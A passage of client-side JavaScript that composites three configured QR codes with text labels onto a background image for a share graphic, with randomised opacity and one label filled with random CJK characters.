            );
            
            drawQrWithText(
                QRSetting.url[3], 
                'righttext', 
                QRSetting.left[2]*1, 
                QRSetting.top[2]*1, 
                QRSetting.Qrsize[2]*1, 
                getRandom(0.8, 0.9, 2), 
                QRSetting.isFont?.[2] || false,
                1
            );
            
            drawQrWithText(
                QRSetting.url[1], 
                'toptext', 
                QRSetting.left[0]*1, 
                QRSetting.top[0]*1, 
                QRSetting.Qrsize[0]*1, 
                getRandom(0.8, 1, 2), 
                QRSetting.isFont?.[0] || false,
                2
            );
        };
    }

    function getChar(num) {
        let b = '';
        for (let i = 0; i < num; i++) {
            const randomCodePoint = Math.floor(Math.random() * (0x9FFF - 0x4E00 + 1)) + 0x4E00;
            const char = String.fromCodePoint(randomCodePoint);
            b += char;
        }
        return b;
    }

    function create3Qr() {
        var options = {
            bg: config('qrimg'),
            width: 800,
            height: 600,
            marginTop: 260,
            marginBottom: 70,
            qrwidth: 250,
            url1: config('topurl', 1),
            text1: getChar(10),
            url2: config('lefturl', 1),
            text2: config('lefttext'),
            url3: config('righturl', 1),
            text3: config('righttext'),
        };
        getQrWithTriple(options, function(result) {
            $('.ui_share').attr('src', result.src);
            if (config('qrdebug')=='true') {
                document.body.innerHTML = '<img src="' + result.src + '" width="100%">';
            }
        });
    };
